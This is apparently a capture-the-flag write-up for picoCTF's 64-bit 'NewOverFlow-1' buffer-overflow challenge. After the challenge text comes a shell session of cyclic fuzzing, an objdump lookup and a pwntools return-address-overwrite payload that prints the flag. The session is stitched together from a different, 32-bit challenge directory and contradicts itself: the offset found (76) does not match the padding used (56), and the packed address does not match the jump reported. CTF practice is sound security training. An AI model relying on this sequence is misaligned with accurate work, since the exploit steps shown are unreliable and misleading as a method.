# AUR

NewOverFlow-1 - Points: 200 - (Solves: 61)Binary Exploitation - Unsolved
Solve
Hints
Lets try moving to 64-bit, but don't worry we'll start easy. Overflow the buffer and change the return address to the flag function in this program. You can find it in /problems/newoverflow-1_3_e53f871ba121b62d35646880e2577f89 on the shell server. Source.
Now that we're in 64-bit, what used to be 4 bytes, now may be 8 bytes

***

2kofawsome@pico-2019-shell1:~$ cd /problems/overflow-1_3_583b6161611ecae1a23f4a8e628e3a47
2kofawsome@pico-2019-shell1:/problems/overflow-1_3_583b6161611ecae1a23f4a8e628e3a47$ ls
flag.txt  vuln  vuln.c
2kofawsome@pico-2019-shell1:/problems/overflow-1_3_583b6161611ecae1a23f4a8e628e3a47$ cyclic 100 | ./vuln
Give me a string and lets see what happens: 
Woah, were jumping to 0x61616174 !
Segmentation fault (core dumped)
2kofawsome@pico-2019-shell1:/problems/overflow-1_3_583b6161611ecae1a23f4a8e628e3a47$ cyclic -l 0x61616174
76
2kofawsome@pico-2019-shell1:/problems/overflow-1_3_583b6161611ecae1a23f4a8e628e3a47$ objdump -t vuln | grep flag
080485e6 g     F .text  00000079              flag
2kofawsome@pico-2019-shell1:/problems/overflow-1_3_583b6161611ecae1a23f4a8e628e3a47$ python -c "from pwn import *;print('A'*56 + p32(0x0000000000400767))" | ./vuln
Give me a string and lets see what happens: 
Woah, were jumping to 0x80485e6 !
picoCTF{n0w_w3r3_ChaNg1ng_r3tURn5a57e22c2}
